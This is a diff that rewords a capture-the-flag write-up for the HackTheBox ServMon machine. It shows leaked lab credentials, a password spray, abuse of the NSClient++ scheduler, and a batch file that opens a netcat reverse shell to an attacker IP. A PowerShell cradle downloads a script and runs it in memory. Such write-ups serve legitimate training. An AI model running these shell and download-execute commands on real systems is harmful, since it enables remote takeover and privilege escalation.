@@ -170,7 +170,7 @@ servmon.htb
 
 ```
 
-A juicy filename — **Passwords.txt** on Nathan's desktop:
+A juicy lead — **Passwords.txt** on Nathan's desktop:
 
 ```Confidential-txt
 Nathan,
@@ -206,7 +206,7 @@ IfH3s4b0Utg0t0H1sH0me
 Gr4etN3w5w17hMySk1Pa5$
 ```
 
-Sprayed both users — SSH login as **Nadine**:
+Sprayed both users — SSH login works as **Nadine**:
 
 > `nadine - L1k3B1gBut7s@W0rk`
 
@@ -216,7 +216,7 @@ One more web service ran on port `8443`:
 
 > `NSClient++`
 
-Verified under **Program Files** — and the password is readable from `nsclient.ini`, or directly:
+It's installed under **Program Files** — and the password is readable from `nsclient.ini`, or displayed directly:
 
 ```powershell
 PS C:\Program Files\NSClient++> ./nscp.exe web password --display
@@ -258,16 +258,11 @@ evil.bat
 c:\temp\nc.exe 10.10.15.32 443 -e cmd.exe
 ```
 
-Then configured a new external script section:
-- Added the key/value with the script path pointing at **evil.bat**
-- Scheduler: command = `lol`, interval = `1m`
-- Saved the configuration and restarted the service from the control panel
+Then configured a new external script section: added the key/value with the script path pointing at **evil.bat**, set the scheduler with command = `lol` and interval = `1m`, and saved the configuration and restarted the service from the control panel.
 
-**Summary**:
-- Download a script and set its path to **evil.bat**, which gets executed
-- Schedule the section to run every **1 minute** — it starts executing once the system restarts
+**Summary**: download a script and set its path to **evil.bat**, which gets executed. Schedule the section to run every **1 minute** — it starts executing once the system restarts.
 
-The script ran as admin because **NSClient++** is monitoring software that deliberately runs as **NT authority\system** — catching the reverse shell on the listening port as `nt authority\system`.
+The script ran as admin because **NSClient++** is monitoring software that deliberately runs as **NT authority\system** — we catch the reverse shell on the listening port as `nt authority\system`.
 
 Gained `root`
 
@@ -275,17 +270,17 @@ Gained `root`
 
 **Additional info**:
 
-- Priv esc options were slim — few privileges available on the account
+Priv esc options were slim — few privileges available on the account.
 
 > Reference for ACL: https://rohnspowershellblog.wordpress.com/2013/03/19/viewing-service-acls/
 
-- Execute an uploaded ACL script directly in memory once downloaded:
+An uploaded ACL script can be executed directly in memory once downloaded:
 
 ```powershell
 $h=New-object -Comobject Msxm12. XMLHTTP; $h. open('GET', 'http://10.10.14.2:8000/Get-ServiceACL.ps1',$false);$h.sendO;iex $h.responseText
 ```
 
-- Examine the service with Get-ServiceAcl:
+Then examine the service with Get-ServiceAcl:
 
 ```sh
 "nscp" | Get-ServiceAcl | select -ExpandProperty Access
